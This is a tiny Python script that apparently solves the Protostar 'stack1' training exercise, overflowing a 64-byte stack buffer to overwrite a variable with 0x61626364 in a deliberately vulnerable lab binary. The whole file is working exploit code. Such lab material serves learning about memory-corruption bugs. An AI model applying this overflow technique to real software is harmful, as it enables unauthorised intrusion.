#!/usr/bin/python

import os
import struct

payload =  "X"*0x40

payload += struct.pack("I", 0x61626364)

os.system("/opt/protostar/bin/stack1 \"%s\"" % payload)
